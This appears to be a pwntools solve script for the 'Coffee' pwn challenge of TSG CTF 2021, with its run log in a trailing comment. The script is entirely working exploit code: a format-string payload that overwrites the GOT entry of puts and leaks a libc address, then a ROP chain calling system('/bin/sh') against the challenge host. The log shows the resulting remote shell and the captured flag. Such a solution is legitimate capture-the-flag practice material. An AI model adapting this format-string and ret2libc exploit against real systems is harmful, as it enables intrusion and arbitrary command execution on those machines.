from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './coffee'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "34.146.101.4"
    PORT = 30002
    s = remote(HOST, PORT)
    libc = ELF('./libc.so.6')
else:
    s = process(BINARY)
    libc = elf.libc

'''
  401286:	48 83 c4 08          	add    rsp,0x8
  40128a:	5b                   	pop    rbx
  40128b:	5d                   	pop    rbp
  40128c:	41 5c                	pop    r12
  40128e:	41 5d                	pop    r13
  401290:	41 5e                	pop    r14
  401292:	41 5f                	pop    r15
  401294:	c3                   	ret   
'''

libc_csu_init = 0x401286
pop_rdi_ret   = 0x401293 # pop rdi; ret;

# GOT overwrite form puts to _start, and libc leak 
index = 6
a0 = libc_csu_init&0xffff
a1 = (libc_csu_init>>16)&0xffff
a0 = ((a0-1-15) % 0x10000) + 1
a1 = ((a1-a0-1-15) % 0x10000) + 1
buf  = b"%29$p-"
buf += b"%%%dc%%%d$hn" % (a0, index+4)
buf += b"%%%dc%%%d$hn" % (a1, index+5)
buf += b"-"*(8-len(buf)%8)
buf += p64(elf.got.puts)
buf += p64(elf.got.puts+2)
buf += p64(elf.sym._start)
s.sendline(buf)

libc_leak   = int(s.recvuntil("-")[:-1], 16)
libc_base   = libc_leak - (libc.sym.__libc_start_main+243)
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# Call system('/bin/sh')
buf  = b"A" * 0x30
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/TSG_CTF_2021/Pwn_Coffee/coffee$ python3 solve.py r
[*] '/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/coffee'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.146.101.4 on port 30002: Done
[*] '/home/mito/CTF/TSG_CTF_2021/Pwn_Coffee/coffee/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    
DEBUG] Sent 0x39 bytes:
    00000000  25 32 39 24  70 2d 25 34  37 32 37 63  25 31 30 24  │%29$│p-%4│727c│%10$│
    00000010  68 6e 25 36  30 38 35 38  63 25 31 31  24 68 6e 2d  │hn%6│0858│c%11│$hn-│
    00000020  18 40 40 00  00 00 00 00  1a 40 40 00  00 00 00 00  │・@@・│・・・・│・@@・│・・・・│
    00000030  b0 10 40 00  00 00 00 00  0a                        │・・@・│・・・・│・│
    00000039
        
libc_leak = 0x7f21fb2f70b3
libc_base = 0x7f21fb2d0000
[*] Switching to interactive mode
                                                                                                                

$ id
uid=999(user) gid=999(user) groups=999(user)
$ ls -l
total 28
-r-xr-xr-x 1 root user 16824 Oct  2 04:02 coffee
-r--r--r-- 1 root user    29 Oct  2 04:02 flag-dcf095f41e7bf00fa7e7cf7ef2ce9083
-r-xr-xr-x 1 root user    86 Oct  2 04:02 start.sh
$ cat flag*
TSGCTF{Uhouho_gori_gori_pwn}
'''
